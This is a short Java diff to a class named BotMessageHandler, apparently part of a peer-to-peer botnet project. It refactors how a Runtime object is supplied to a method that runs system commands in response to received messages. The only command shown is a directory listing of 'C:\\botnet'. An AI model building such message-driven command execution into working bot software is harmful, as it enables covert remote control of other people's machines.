@@ -21,11 +21,13 @@ class BotMessageHandler {
     private P2pLayer p2pLayer;
     private ChunkReader chunkReader;
     private KademliaPeer me;
+    private Runtime runtime;
 
-    BotMessageHandler(P2pLayer p2pLayer, ChunkReader chunkReader, KademliaPeer me) {
+    BotMessageHandler(P2pLayer p2pLayer, ChunkReader chunkReader, KademliaPeer me, Runtime runtime) {
         this.p2pLayer = p2pLayer;
         this.chunkReader = chunkReader;
         this.me = me;
+        this.runtime = runtime;
     }
 
     void handleCommandMessage(Message message) {
@@ -97,7 +99,7 @@ class BotMessageHandler {
     String executeSystemCommand(String command) {
         if ("dir".equals(command)) {
             try {
-                Process exec = Runtime.getRuntime().exec("cmd /c dir C:\\botnet");
+                Process exec = runtime.exec("cmd /c dir C:\\botnet");
                 exec.waitFor();
                 if (exec.exitValue() != 0) {
                     return null;
